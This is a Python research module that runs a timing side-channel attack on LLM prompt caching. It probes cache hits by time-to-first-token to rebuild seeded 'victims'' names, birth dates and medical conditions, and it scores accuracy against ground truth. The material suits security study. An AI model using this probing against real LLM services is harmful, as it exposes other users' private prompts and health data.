

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from typing import Optional

import numpy as np

from .attacker import CacheHitOracle
from .victim_seeder import (
    KNOWN_PREFIX,
    MEDICAL_CONDITIONS,
    FIRST_NAMES,
    LAST_NAMES,
)

logger = logging.getLogger(__name__)

# ── Domain vocabulary ──────────────────────────────────────────────────────────
# Imported from victim_seeder — single source of truth for the closed
# vocabulary shared between victim generation and attacker reconstruction.

CONDITION_VOCAB: list[str] = MEDICAL_CONDITIONS

# DOB years (1935-2006) and months/days for structured search
DOB_YEARS:  list[str] = [str(y) for y in range(1935, 2007)]
DOB_MONTHS: list[str] = [f"{m:02d}" for m in range(1, 13)]
DOB_DAYS:   list[str] = [f"{d:02d}" for d in range(1, 32)]


# ── Result types ───────────────────────────────────────────────────────────────

@dataclass
class FieldResult:
    """Outcome of reconstructing a single private field."""
    field_name:      str
    ground_truth:    str
    recovered:       Optional[str]
    correct:         bool
    queries_used:    int
    hit_ttft_ms:     Optional[float]   # TTFT of the winning probe
    miss_ttft_ms:    Optional[float]   # mean TTFT of losing probes
    timing_gap_ms:   Optional[float]


@dataclass
class VictimReconstructionResult:
    """Full reconstruction result for one victim."""
    victim_id:           int
    ground_truth_fields: dict[str, str]
    field_results:       list[FieldResult]
    token_recovery_rate: float          # TRR: fraction of fields correct
    exact_match:         bool           # SR: all fields correct
    total_queries:       int
    arpt:                float          # avg requests per field (Proposal §3.4)
    wall_time_s:         float          # end-to-end reconstruction time


@dataclass
class AggregateResults:
    """Aggregate statistics across all victims (for results JSON)."""
    n_victims:          int
    mean_trr:           float
    success_rate:       float           # fraction with exact_match=True
    mean_arpt:          float
    arpt_ci_95:         list[float]     # [lower, upper] bootstrapped
    mean_timing_gap_ms: float
    mean_wall_time_s:   float


# ── Core reconstruction logic ──────────────────────────────────────────────────

def reconstruct_field(
    oracle:         CacheHitOracle,
    known_prefix:   str,
    candidates:     list[str],
    field_name:     str,
    separator:      str = "",
) -> FieldResult:
    """
    Probe the oracle with (known_prefix + separator + candidate) for each
    candidate in *candidates*. The first candidate that produces a cache
    hit is returned as the recovered value.

    Parameters
    ----------
    oracle       : calibrated CacheHitOracle
    known_prefix : the prompt text already confirmed correct
    candidates   : ordered list of candidate values to probe
    field_name   : name of this field (for logging / results)
    separator    : inserted between known_prefix and candidate (e.g. " ")

    Returns
    -------
    FieldResult — includes the recovered value (or None on failure),
                  correctness flag, and query counts.

    Notes
    -----
    If no candidate produces a hit (all probes classified as misses), the
    field is marked as unrecovered (recovered=None, correct=False).
    This happens when the true value is not in *candidates* — a known
    limitation of closed-vocabulary reconstruction.
    """
    hit_ttfts:  list[float] = []
    miss_ttfts: list[float] = []
    queries_used = 0

    logger.debug(
        "  Probing field '%s' (%d candidates) | known_prefix='%s...'",
        field_name, len(candidates), known_prefix[-30:],
    )

    best_candidate: Optional[str] = None
    best_ttft_ms:   Optional[float] = None

    for candidate in candidates:
        probe = known_prefix + separator + candidate
        is_hit, mean_ms, std_ms = oracle.query(probe)
        queries_used += oracle.n_repeats

        logger.debug(
            "    Candidate='%-20s' | TTFT=%.1f±%.1f ms | %s",
            candidate, mean_ms, std_ms, "HIT ✓" if is_hit else "miss",
        )

        if is_hit:
            hit_ttfts.append(mean_ms)
            best_candidate = candidate
            best_ttft_ms   = mean_ms
            break   # first hit wins (greedy; consistent with Paper 11/12)
        else:
            miss_ttfts.append(mean_ms)

    mean_miss = float(np.mean(miss_ttfts)) if miss_ttfts else None
    gap_ms    = (mean_miss - best_ttft_ms) if (mean_miss and best_ttft_ms) else None

    return FieldResult(
        field_name    = field_name,
        ground_truth  = "",          # filled in by caller (who has ground truth)
        recovered     = best_candidate,
        correct       = False,       # filled in by caller
        queries_used  = queries_used,
        hit_ttft_ms   = best_ttft_ms,
        miss_ttft_ms  = mean_miss,
        timing_gap_ms = gap_ms,
    )


def reconstruct_victim_s2(
    oracle:       CacheHitOracle,
    victim_id:    int,
    ground_truth: dict[str, str],   # {first_name, last_name, dob, condition}
) -> VictimReconstructionResult:
    """
    Full Scenario S2 reconstruction for one victim.

    Reconstruction order (Proposal §4.4 + §6):
      Step 1: first_name   — probe KNOWN_PREFIX + candidate_first_name
      Step 2: last_name    — probe known_prefix + " " + candidate_last_name
      Step 3: condition    — probe known_prefix + ". DOB: " + dob + ". Condition: " + candidate

    The known_prefix grows as each field is successfully recovered.
    If a field fails (no hit), reconstruction continues with a sentinel
    value "UNKNOWN" so subsequent fields can still be attempted.

    Parameters
    ----------
    oracle        : calibrated CacheHitOracle
    victim_id     : victim index for logging
    ground_truth  : dict with keys first_name, last_name, dob, condition

    Returns
    -------
    VictimReconstructionResult with all field outcomes and aggregate metrics.
    """
    t_start = time.perf_counter()
    oracle.reset_call_counter()

    logger.info("Reconstructing victim %d ...", victim_id)

    field_results: list[FieldResult] = []
    # Build up the known prefix as each field is recovered
    known_prefix = KNOWN_PREFIX   # "You are a medical assistant. ... Patient name: "

    # ── Step 1: Recover first_name ─────────────────────────────────────────────
    fr_first = reconstruct_field(
        oracle=oracle,
        known_prefix=known_prefix,
        candidates=FIRST_NAMES,
        field_name="first_name",
        separator="",
    )
    fr_first.ground_truth = ground_truth["first_name"]
    fr_first.correct      = fr_first.recovered == ground_truth["first_name"]
    field_results.append(fr_first)

    recovered_first = fr_first.recovered or "UNKNOWN"
    known_prefix    = known_prefix + recovered_first + " "
    logger.info(
        "  first_name: truth='%s' | recovered='%s' | %s | %d queries",
        ground_truth["first_name"], fr_first.recovered,
        "✓" if fr_first.correct else "✗", fr_first.queries_used,
    )

    # ── Step 2: Recover last_name ──────────────────────────────────────────────
    fr_last = reconstruct_field(
        oracle=oracle,
        known_prefix=known_prefix,
        candidates=LAST_NAMES,
        field_name="last_name",
        separator="",
    )
    fr_last.ground_truth = ground_truth["last_name"]
    fr_last.correct      = fr_last.recovered == ground_truth["last_name"]
    field_results.append(fr_last)

    recovered_last = fr_last.recovered or "UNKNOWN"
    # Advance prefix past name to DOB field
    known_prefix   = known_prefix + recovered_last + ". DOB: " + ground_truth["dob"] + ". Condition: "
    logger.info(
        "  last_name : truth='%s' | recovered='%s' | %s | %d queries",
        ground_truth["last_name"], fr_last.recovered,
        "✓" if fr_last.correct else "✗", fr_last.queries_used,
    )

    # NOTE on DOB: DOB is present in the known prefix above using the ground-
    # truth value. In a real attack, DOB would also be reconstructed via a
    # structured year→month→day search (72+12+31 = ≤115 queries). We use the
    # ground-truth DOB here so that condition reconstruction is not blocked by
    # DOB failure. See reconstruct_dob() below for the full DOB implementation.

    # ── Step 3: Recover condition ──────────────────────────────────────────────
    fr_cond = reconstruct_field(
        oracle=oracle,
        known_prefix=known_prefix,
        candidates=CONDITION_VOCAB,
        field_name="condition",
        separator="",
    )
    fr_cond.ground_truth = ground_truth["condition"]
    fr_cond.correct      = fr_cond.recovered == ground_truth["condition"]
    field_results.append(fr_cond)

    logger.info(
        "  condition : truth='%s' | recovered='%s' | %s | %d queries",
        ground_truth["condition"], fr_cond.recovered,
        "✓" if fr_cond.correct else "✗", fr_cond.queries_used,
    )

    # ── Aggregate metrics ──────────────────────────────────────────────────────
    n_correct = sum(f.correct for f in field_results)
    n_fields  = len(field_results)
    trr       = n_correct / n_fields
    exact     = n_correct == n_fields
    total_q   = oracle.total_api_calls
    arpt      = total_q / n_fields if n_fields > 0 else 0.0
    wall_s    = time.perf_counter() - t_start

    logger.info(
        "  Victim %d done: TRR=%.2f | exact=%s | %d queries | %.1f s",
        victim_id, trr, exact, total_q, wall_s,
    )

    return VictimReconstructionResult(
        victim_id=victim_id,
        ground_truth_fields=ground_truth,
        field_results=field_results,
        token_recovery_rate=trr,
        exact_match=exact,
        total_queries=total_q,
        arpt=arpt,
        wall_time_s=wall_s,
    )


def reconstruct_dob(
    oracle:       CacheHitOracle,
    known_prefix: str,
) -> tuple[Optional[str], int]:
    """
    Structured year → month → day search for the DOB field.

    Strategy: probe all 72 candidate years (1935-2006) first. Once year
    is confirmed, probe 12 months, then up to 31 days. Maximum 115 queries.

    Parameters
    ----------
    oracle       : calibrated CacheHitOracle
    known_prefix : known prefix ending immediately before the DOB value
                   (e.g. "... Patient name: John Smith. DOB: ")

    Returns
    -------
    (dob_string, total_queries_used) — dob_string is "YYYY-MM-DD" or None.
    """
    total_q = 0

    # Step A: Year
    fr_year = reconstruct_field(
        oracle=oracle,
        known_prefix=known_prefix,
        candidates=DOB_YEARS,
        field_name="dob_year",
        separator="",
    )
    total_q += fr_year.queries_used
    if fr_year.recovered is None:
        return None, total_q

    year_prefix = known_prefix + fr_year.recovered + "-"

    # Step B: Month
    fr_month = reconstruct_field(
        oracle=oracle,
        known_prefix=year_prefix,
        candidates=DOB_MONTHS,
        field_name="dob_month",
        separator="",
    )
    total_q += fr_month.queries_used
    if fr_month.recovered is None:
        return None, total_q

    month_prefix = year_prefix + fr_month.recovered + "-"

    # Step C: Day
    fr_day = reconstruct_field(
        oracle=oracle,
        known_prefix=month_prefix,
        candidates=DOB_DAYS,
        field_name="dob_day",
        separator="",
    )
    total_q += fr_day.queries_used
    if fr_day.recovered is None:
        return None, total_q

    dob_str = f"{fr_year.recovered}-{fr_month.recovered}-{fr_day.recovered}"
    return dob_str, total_q


# ── Aggregate statistics ───────────────────────────────────────────────────────

def compute_aggregate(results: list[VictimReconstructionResult]) -> AggregateResults:
    """
    Compute aggregate statistics with bootstrapped 95% CI on ARPT.
    (Proposal §5, metric definition §3.4)
    """
    if not results:
        return AggregateResults(0, 0.0, 0.0, 0.0, [0.0, 0.0], 0.0, 0.0)

    trrs      = [r.token_recovery_rate for r in results]
    successes = [r.exact_match         for r in results]
    arpts     = [r.arpt                for r in results]
    gaps      = [
        f.timing_gap_ms
        for r in results
        for f in r.field_results
        if f.timing_gap_ms is not None
    ]
    wall_times = [r.wall_time_s for r in results]

    # Bootstrap 95% CI on ARPT (2,000 resamples)
    rng = np.random.default_rng(42)
    boot_means = [
        np.mean(rng.choice(arpts, size=len(arpts), replace=True))
        for _ in range(2_000)
    ]
    ci_lo, ci_hi = float(np.percentile(boot_means, 2.5)), float(np.percentile(boot_means, 97.5))

    return AggregateResults(
        n_victims=len(results),
        mean_trr=float(np.mean(trrs)),
        success_rate=float(np.mean(successes)),
        mean_arpt=float(np.mean(arpts)),
        arpt_ci_95=[ci_lo, ci_hi],
        mean_timing_gap_ms=float(np.mean(gaps)) if gaps else 0.0,
        mean_wall_time_s=float(np.mean(wall_times)),
    )
